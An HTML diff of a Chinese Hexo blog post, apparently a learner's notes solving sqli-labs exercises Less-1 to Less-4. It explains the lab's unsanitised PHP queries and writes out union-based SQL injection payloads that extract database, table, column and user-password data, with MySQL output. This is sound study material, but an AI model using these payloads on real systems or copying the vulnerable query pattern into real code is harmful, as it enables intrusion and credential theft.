@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"10vexh.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="sql-lab刷题记录​        sqllab是atao师傅推荐我用来学sql的，网上已经有很多现成的writeup，写的知识点也比我完善，我只是用来简单记录一下自己的学习的过程。搭建的方法也很简单，网上都有，记得php版本要在7.0以前，避免要更改sql的函数。 前言为了方便后面做题，我先找到目标的数据库，然后在命令行中进行调试方便找到目标。 先是默认的账号密码进入 mysql -uroo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021版OWASP TOP 10">
+<meta property="og:url" content="http://10vexh.top/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="good good study,day day up.">
+<meta property="og:description" content="sql-lab刷题记录​        sqllab是atao师傅推荐我用来学sql的，网上已经有很多现成的writeup，写的知识点也比我完善，我只是用来简单记录一下自己的学习的过程。搭建的方法也很简单，网上都有，记得php版本要在7.0以前，避免要更改sql的函数。 前言为了方便后面做题，我先找到目标的数据库，然后在命令行中进行调试方便找到目标。 先是默认的账号密码进入 mysql -uroo">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-02T13:15:03.000Z">
+<meta property="article:modified_time" content="2022-01-06T17:11:49.357Z">
+<meta property="article:author" content="10vexh">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://10vexh.top/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2021版OWASP TOP 10 | good good study,day day up.</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">good good study,day day up.</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://10vexh.top/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="10vexh">
+      <meta itemprop="description" content="水至清则无鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="good good study,day day up.">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2021版OWASP TOP 10
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-02 21:15:03" itemprop="dateCreated datePublished" datetime="2022-01-02T21:15:03+08:00">2022-01-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-07 01:11:49" itemprop="dateModified" datetime="2022-01-07T01:11:49+08:00">2022-01-07</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="sql-lab刷题记录"><a href="#sql-lab刷题记录" class="headerlink" title="sql-lab刷题记录"></a>sql-lab刷题记录</h1><p>​        sqllab是atao师傅推荐我用来学sql的，网上已经有很多现成的writeup，写的知识点也比我完善，我只是用来简单记录一下自己的学习的过程。搭建的方法也很简单，网上都有，记得php版本要在7.0以前，避免要更改sql的函数。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了方便后面做题，我先找到目标的数据库，然后在命令行中进行调试方便找到目标。</p>
+<p>先是默认的账号密码进入</p>
+<p>mysql -uroot -p123456</p>
+<p>用<code>show databases;</code></p>
+<p>找到默认的数据库security,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| dvwa               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| pikachu            |</span><br><span class="line">| security           |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>use security</code>，进入数据库</p>
+<p><code>show tables;</code></p>
+<p>找到表users</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>在表中进行搜索，方便做题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where 1=1;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-1-基于错误的GET单引号字符型注入"><a href="#Less-1-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 基于错误的GET单引号字符型注入"></a>Less-1 基于错误的GET单引号字符型注入</h2><p>首先根据题目名字，尝试输入<code>?id=-1&#39;</code></p>
+<p>返回了报错的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>然后我们进入源码中查看，发现其从中读入的数据，没有经过处理，直接读入</p>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+<p>LIMIT表示可以返回的记录数。</p>
+<p>我们尝试在数据库中利用该语句进行查询，发现是否加’都能正常返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">mysql&gt; select * from users where id=1 limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>而如果输入<code>?id=1&#39;</code>加了额外的<code>&#39;</code>意味着会让sql语句进行提前闭合，从而报错</p>
+<p><code>select * from users where id=&#39;1&#39;&#39; limit 0,1;</code></p>
+<p>而我们将后面部分利用<code>?id=1&#39;#</code>注释掉，则可以正常返回空的查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>当我们输入1’# 的时候，回车还需要一个冒号作为闭合，因为系统读到#后，不会继续往下面读，默认下面的都是注释忽略了，进而达到绕过的目的。</p>
+<p>因此我们可以考虑通过在1’后面加上自己想查询的东西，得到想要的答案。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; order by 1,2,3#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; order by 1,2,3,4#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>?id=1&#39; order by 1,2,3--+</code>，发现其中存在三行,此时可以通过联合注入的方式进行查询。</p>
+<p><code>?id=-1&#39; union select 1,2,3--+</code>发现在2，3的位置会进行回显。</p>
+<p>因此我们可以开始注入了，一般的思路是获取字段数-&gt;数据库名-&gt;表名-&gt;列名-&gt;值</p>
+<p>字段数就靠上面的order by进行猜解，或者通过union select直接尝试，直到遇到报错。</p>
+<p>我们已知了有3列，而2，3列会回显，因此我们下一步进行查数据库名。</p>
+<p>先在数据库里试一下。有几个常用的查询的默认</p>
+<p>database()：当前网站使用的数据库</p>
+<p>version()：当前Mysql的版本</p>
+<p>user()：当前Mysql的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select version(),user(),database()#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+--------+----------------+----------+</span><br><span class="line">| id     | username       | password |</span><br><span class="line">+--------+----------------+----------+</span><br><span class="line">| 5.7.26 | root@localhost | security |</span><br><span class="line">+--------+----------------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>因此我们再在网站中进行查询，<code>?id=-1&#39; union select 1,user(),database()--+</code>，进而得到数据库名和用户。</p>
+<p>接着查询表。</p>
+<p>同样先试一下</p>
+<p>group_concat()：表示把一个分组的值串起来。</p>
+<p>information_schema：mysql自带的信息数据库存在着存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#x27;security&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">| id | username | password                      |</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">|  1 | 2        | emails,referers,uagents,users |</span><br><span class="line">+----+----------+-------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>因此我们再在网站中进行查询，<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#39;security&#39;--+</code>，得到表名。</p>
+<p>再对user表进行查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#x27;security&#x27; and table_name=&#x27;users&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------------------+</span><br><span class="line">| id | username | password             |</span><br><span class="line">+----+----------+----------------------+</span><br><span class="line">|  1 | 2        | id,username,password |</span><br><span class="line">+----+----------+----------------------+</span><br></pre></td></tr></table></figure>
+
+<p>再在网站中进行查询<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#39;security&#39; and table_name=&#39;users&#39;--+</code>，得到字段名。</p>
+<p>最后查用户名和密码。(格式太丑不放了)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;-1&#x27; union select 1,group_concat(username),group_concat(password) from users#&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<p>在网站中查询<code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code></p>
+<p>会回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>
+
+<p>然后差不多就完了，接着下一题。</p>
+<h2 id="Less-2-基于错误的get整型注入"><a href="#Less-2-基于错误的get整型注入" class="headerlink" title="Less-2 基于错误的get整型注入"></a>Less-2 基于错误的get整型注入</h2><p>这题与上一题看起来差不多，只在于一个<code>&#39;&#39;</code>的差别当我们以?<code>id=-1 or 1=1#</code>进行判断报错的时候i，发现返回了整个包裹的<code>&#39; or 1=1 LIMIT 0,1</code>所以可以判断我们多输入了一个<code>&#39;</code>,是多余的，查看代码源码也发现如此</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第二题的</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=-1 union select 1,2,3#</code> 判断注入点</p>
+<p><code>?id=-1 union select 1,database(),version()#</code> 取数据库名</p>
+<p><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;#</code>  取表名</p>
+<p><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#</code> 取列</p>
+<p><code>?id=-1 union select 1,group_concat(username),group_concat(password) from users#</code> 取内容</p>
+<h2 id="Less-3-基于错误的get单引号变形字符型注入"><a href="#Less-3-基于错误的get单引号变形字符型注入" class="headerlink" title="Less-3 基于错误的get单引号变形字符型注入"></a>Less-3 基于错误的get单引号变形字符型注入</h2><p>同样用<code>?id=-1&#39; or 1=1#</code>测试，发现返回的错误为<code>&#39;) LIMIT 0,1</code>，证明这次的是用<code>)</code>进行包裹的。</p>
+<p>再次查看源代码，发现确实。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第二题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">//第三题的</span><br></pre></td></tr></table></figure>
+
+<p>然后在这里我才意识到<code>?id=-1&#39; or 1=1#</code>是用不了的，而<code>?id=-1&#39; or 1=1--+</code>可以用，我本来以为–+一样是注释符，查了资料才发现，<code>--</code>并不是注释符，而<code>--</code>后还要加上空格，而web中<code>空格</code>和<code>+</code>等价，所以我们一般用<code>--+</code>，其他常用的注释符还有<code>/**/</code>和<code>#</code></p>
+<p>所以这题我们用–+</p>
+<p><code>?id=-1&#39;)  union select 1,2,3--+</code> 找注入点</p>
+<p><code>?id=-1&#39;)  union select 1,database(),user()--+</code> 找数据库名</p>
+<p><code>?id=-1&#39;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> 取表名</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39;--+</code>  取列</p>
+<p><code>?id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users--+</code> 取内容</p>
+<h2 id="Less-4-基于错误的GET双引号字符型注入"><a href="#Less-4-基于错误的GET双引号字符型注入" class="headerlink" title="Less-4 基于错误的GET双引号字符型注入"></a>Less-4 基于错误的GET双引号字符型注入</h2><p>还是先试一下<code>?id=-1&#39; or 1=1#</code>，然后发现没有任何报错的反应，然后我选择直接看了源码，发现这次的代码与之前有所不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">//第三题的</span><br><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class="line">//第四题</span><br></pre></td></tr></table></figure>
+
+<p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code> 表示在php中.是用来连接的，表示把$id存储的值加上一个双引号然后在赋值给$id 这个变量，很明显我们这题要用到双引号的绕过。</p>
+<p>当我们将用<code>?id=1&quot;</code>进行报错的验证，会发现返回的错误为<code>&quot;1&quot;&quot;) LIMIT 0,1</code>，从而可以判断在该处要进行双引号和括号的闭合</p>
+<p><code>?id=-1&quot;) union select 1,2,3--+</code> 找注入点</p>
+<p><code>?id=-1&quot;) union select 1,database(),user()--+</code> 找数据库</p>
+<p><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> 找表名</p>
+<p><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code> 找列名</p>
+<p><code>?id=-1&quot;) union select 1,group_concat(username),group_concat(password) from users--+</code> 取数</p>
+<h2 id="Less-5-双注入GET单引号字符型注入"><a href="#Less-5-双注入GET单引号字符型注入" class="headerlink" title="Less-5 双注入GET单引号字符型注入"></a>Less-5 双注入GET单引号字符型注入</h2>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>10vexh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://10vexh.top/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="2021版OWASP TOP 10">http://10vexh.top/2022/01/02/sql-lab刷题记录/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/02/2021%E7%89%88OWASP-TOP-10/" rel="prev" title="2021版OWASP TOP 10">
+      <i class="fa fa-chevron-left"></i> 2021版OWASP TOP 10
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">sql-lab刷题记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">Less-1 基于错误的GET单引号字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84get%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">Less-2 基于错误的get整型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84get%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.</span> <span class="nav-text">Less-3 基于错误的get单引号变形字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.5.</span> <span class="nav-text">Less-4 基于错误的GET双引号字符型注入</span></a></li><li class="nav-item 